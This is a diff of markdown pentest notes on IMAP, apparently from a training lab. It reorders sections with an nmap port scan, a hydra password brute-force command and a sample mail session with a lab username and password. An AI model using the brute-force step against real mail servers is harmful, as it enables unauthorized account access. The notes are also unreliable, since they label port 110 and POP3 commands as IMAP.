@@ -1,54 +1,5 @@
 --- ---
 
-<h2>Find IMAP Port</h2>
-
-- Nmap
-```Terminal
-nmap -sV -sC IP -p110
-```
-
-- Possible to find IMAP on an other port
-
----
-
-<h2>Attack</h2>
-
-- Brute Force
-```Terminal
-hydra -l username -P PASSWORD-LIST.txt -f IP imap
-```
-
----
-
-<h2>Connection</h2>
-
-- IMAP Commands
-```Terminal
-USER frank
-+OK frank                             #Machine Response
-PASS D2xc9CgD
-+OK 1 messages (179) octets           #Machine Response
-STAT
-+OK 1 179                             #Machine Response
-LIST
-+OK 1 messages (179) octets           #Machine Response
-1 179
-.
-RETR 1
-+OK                                   #Machine Response
-From: Mail Server 
-To: Frank 
-subject: Sending email with Telnet
-Hello Frank,
-I am just writing to say hi!
-.
-QUIT
-+OK MACHINE_IP closing connection     #Machine Response
-Connection closed by foreign host.
-```
-
----
-
 <h2>What is IMAP</h2>
 
 Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.
@@ -89,6 +40,47 @@ Connection closed by foreign host.
 
 It is clear that IMAP sends the login credentials in cleartext, as we can see in the command `LOGIN frank D2xc9CgD`. Anyone watching the network traffic would be able to know Frank’s username and password.
 
+---
+<h3>Find IMAP Port</h3>
+- Nmap
+```Terminal
+nmap -sV -sC IP -p110
+```
 
-**Brute Force Syntax**
+- Possible to find IMAP on an other port
+
+---
+<h3>Attack</h3>
+- Brute Force
+```Terminal
+hydra -l username -P PASSWORD-LIST.txt -f IP imap
+```
+
+---
+<h3>Connection</h3>
+
+- IMAP Commands
+```Terminal
+USER frank
++OK frank                             #Machine Response
+PASS D2xc9CgD
++OK 1 messages (179) octets           #Machine Response
+STAT
++OK 1 179                             #Machine Response
+LIST
++OK 1 messages (179) octets           #Machine Response
+1 179
+.
+RETR 1
++OK                                   #Machine Response
+From: Mail Server 
+To: Frank 
+subject: Sending email with Telnet
+Hello Frank,
+I am just writing to say hi!
+.
+QUIT
++OK MACHINE_IP closing connection     #Machine Response
+Connection closed by foreign host.
+```
 
